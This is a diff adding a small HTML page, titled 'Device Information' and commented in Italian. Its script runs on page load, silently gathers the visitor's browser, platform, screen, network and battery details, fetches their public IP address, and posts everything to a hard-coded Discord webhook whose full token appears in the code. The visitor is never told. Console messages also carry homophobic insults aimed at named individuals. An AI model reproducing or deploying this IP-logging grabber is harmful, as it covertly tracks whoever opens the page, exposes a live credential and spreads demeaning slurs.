@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Information</title>
+</head>
+<body>
+    <h1>Device Information</h1>
+
+    <script>
+        async function getDeviceInfo() {
+            const deviceInfo = {
+                userAgent: navigator.userAgent,           // Informazioni sul browser e sistema operativo
+                platform: navigator.platform,             // Piattaforma del sistema operativo
+                language: navigator.language,             // Lingua del browser
+                cookiesEnabled: navigator.cookieEnabled,  // Stato dei cookie
+                screenResolution: `${window.screen.width}x${window.screen.height}`,  // Risoluzione dello schermo
+                colorDepth: window.screen.colorDepth,     // Profondità dei colori
+                online: navigator.onLine,                 // Stato della connessione
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null,                                 // Informazioni sulla connessione di rete
+                battery: null,                            // Informazioni sulla batteria (da ottenere)
+                ipAddress: null                           // Indirizzo IP (da ottenere)
+            };
+
+            // Ottieni lo stato della batteria
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                deviceInfo.battery = {
+                    charging: battery.charging,
+                    level: battery.level * 100 + '%',
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            }
+
+            // Ottieni l'indirizzo IP tramite un servizio esterno
+            await fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    deviceInfo.ipAddress = data.ip;
+                });
+
+            // Costruisci il payload per Discord
+            const payload = {
+                content: "New device information:",
+                embeds: [{
+                    title: "Device Information",
+                    color: 3447003,  // Blu
+                    fields: [
+                        { name: "User Agent", value: deviceInfo.userAgent, inline: false },
+                        { name: "Platform", value: deviceInfo.platform, inline: false },
+                        { name: "Language", value: deviceInfo.language, inline: false },
+                        { name: "Cookies Enabled", value: deviceInfo.cookiesEnabled.toString(), inline: false },
+                        { name: "Screen Resolution", value: deviceInfo.screenResolution, inline: false },
+                        { name: "Color Depth", value: deviceInfo.colorDepth.toString(), inline: false },
+                        { name: "Online", value: deviceInfo.online.toString(), inline: false },
+                        { name: "IP Address", value: deviceInfo.ipAddress, inline: false },
+                    ]
+                }]
+            };
+
+            // Invia i dati al webhook di Discord
+            const webhookUrl = 'https://discord.com/api/webhooks/1272243742962614374/6qq-6f1Y7sXupLfshryiw4nkNMOQFHGOzWd0l0iG0p-1SzJxHd0nScxzWHTMiZ2SJ9eM';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                if (response.ok) {
+                    console.log('EA SPORT , MARCO GAY');
+                } else {
+                    console.error('EA SPORT, RAFFY GAY');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        // Esegui la funzione al caricamento della pagina
+        window.onload = getDeviceInfo;
+    </script>
+</body>
+</html>
